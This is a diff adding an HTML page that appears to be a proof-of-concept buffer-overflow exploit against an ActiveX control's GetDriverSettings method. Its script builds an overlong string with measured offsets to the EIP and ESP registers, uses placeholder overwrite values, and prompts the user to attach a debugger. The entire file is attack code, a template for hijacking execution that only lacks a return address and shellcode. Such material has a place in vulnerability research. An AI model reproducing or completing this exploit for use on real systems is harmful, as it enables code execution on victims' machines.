@@ -1,0 +1,36 @@
+<html>
+<object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C' id='target'>
+</object>
+<script >
+
+offset_to_eip = 717;
+offset_to_esp = 737;
+buffer_length = 1000;
+
+junk1 = '';
+for (counter=0; counter < offset_to_eip; counter++) junk1 += 'X';
+
+eip = 'AAAA';
+
+junk2 = '';
+for (counter=0; counter < (offset_to_esp - offset_to_eip - eip.length); counter++) junk2 += 'Y';
+
+esp = 'BBBB';
+
+junk3 = '';
+for (counter=0; counter < (buffer_length - junk1.length - eip.length - junk2.length - esp.length); counter++) junk3 += 'Z';
+
+ret = '';
+ret += junk1 + eip + junk2 + esp + junk3;
+
+arg1 = 'printer';
+arg2 = 'realm';
+arg3 = 'user';
+arg4 = 'pass';
+
+alert("Attach debugger!");
+
+target.GetDriverSettings(ret,arg2,arg3,arg4);
+
+</script>
+</html>
